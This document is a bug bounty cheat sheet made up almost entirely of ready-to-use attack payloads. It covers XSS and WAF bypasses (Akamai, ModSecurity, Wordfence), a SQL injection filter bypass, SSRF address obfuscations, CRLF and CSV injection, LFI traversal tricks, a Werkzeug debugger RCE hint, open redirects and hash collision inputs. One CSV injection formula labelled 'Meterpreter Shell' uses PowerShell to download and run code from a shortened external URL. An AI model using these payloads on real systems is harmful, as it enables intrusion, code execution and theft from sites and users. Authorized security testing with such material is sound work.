# Bug Bounty Cheat Sheet

## XSS

**Chrome XSS-Auditor Bypass** by [Masato Kinugawa](https://github.com/masatokinugawa)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```
**Kona WAF (Akamai) Bypass**

```html
\');confirm(1);//
```

**ModSecurity WAF Bypass**
Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence XSS Bypasses**

```html
<meter onmouseover="alert(1)"
```

```html
'">><div><meter onmouseover="alert(1)"</div>"
```

```html
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**jQuery < 3.0.0 XSS**
 by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)

```js
$.get('http://sakurity.com/jqueryxss')
```

## SQLI

**Akamai Kona Bypass**

* `MID` instead of `SUBSTRING`
* `LIKE` instead of `=`
* `/**/` instead of a `space`
* `CURRENT_USER` instead of `CURRENT_USER()`
* ` "` instead of `'`

Final example: 

```sql
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```

## SSRF

```
http://0177.1/
```

```
http://0x7f.1/
```

```
https://520968996
```

_Note:_ The latter can be calculated using http://www.subnetmask.info/

**Exotic Handlers**

```
gopher://, dict://, php://, jar://, tftp://
```

**IPv6**

```
http://[::1]
```

```
http://[::]
```

## CRLF Injection || HTTP Response Splitting

```
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

**CRLF Injection to XSS**

```
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

## CSV Injection

**Newline character**

```
%0A-3+3+cmd|' /C calc'!D2
```

**Meterpreter Shell**

```
=cmd|'/C powershell IEX(wget bit.ly/1X146m3)'!A0
```

## LFI

**Filter Bypass**

```
"../\", " ..\/", "/.." & "\/.."
```

## RCE

**Werkzeug Debugger**

Find somewhere where user input can be supplied and submit the following string to cause an error:

```
strіng
```

If the target is running their application in debug mode you might be able to run commands. If you are running the target locally, you can probably brute-force the debugger PIN. The debugger PIN is always in the following format: `***-***-***`.

## Open Redirect

```
/google.com
```

```
%09/google.com
```

```
%5cgoogle.com
```

```
//www.google.com/%2f%2e%2e
```

```
//www.google.com/%2e%2e
```

## Crypto

**MD5 Collision Strings**

```
4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2
```

```
4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2
```

**SHA-1 Collision Strings**

```
255044462D312E330A25E2E3CFD30A0A0A312030206F626A0A3C3C2F57696474682032203020522F4865696768742033203020522F547970652034203020522F537562747970652035203020522F46696C7465722036203020522F436F6C6F7253706163652037203020522F4C656E6774682038203020522F42697473506572436F6D706F6E656E7420383E3E0A73747265616D0AFFD8FFFE00245348412D3120697320646561642121212121852FEC092339759C39B1A1C63C4C97E1FFFE017F46DC93A6B67E013B029AAA1DB2560B45CA67D688C7F84B8C4C791FE02B3DF614F86DB1690901C56B45C1530AFEDFB76038E972722FE7AD728F0E4904E046C230570FE9D41398ABE12EF5BC942BE33542A4802D98B5D70F2A332EC37FAC3514E74DDC0F2CC1A874CD0C78305A21566461309789606BD0BF3F98CDA8044629A1
```

```
255044462D312E330A25E2E3CFD30A0A0A312030206F626A0A3C3C2F57696474682032203020522F4865696768742033203020522F547970652034203020522F537562747970652035203020522F46696C7465722036203020522F436F6C6F7253706163652037203020522F4C656E6774682038203020522F42697473506572436F6D706F6E656E7420383E3E0A73747265616D0AFFD8FFFE00245348412D3120697320646561642121212121852FEC092339759C39B1A1C63C4C97E1FFFE017346DC9166B67E118F029AB621B2560FF9CA67CCA8C7F85BA84C79030C2B3DE218F86DB3A90901D5DF45C14F26FEDFB3DC38E96AC22FE7BD728F0E45BCE046D23C570FEB141398BB552EF5A0A82BE331FEA48037B8B5D71F0E332EDF93AC3500EB4DDC0DECC1A864790C782C76215660DD309791D06BD0AF3F98CDA4BC4629B1
```

**Bcrypt Wraparoud Bug**

```
000000000000000000000000000000000000000000000000000000000000000000000000
```

```
012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234
```

```
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345
```

## Content Injection

```
❤ bounty pls
```
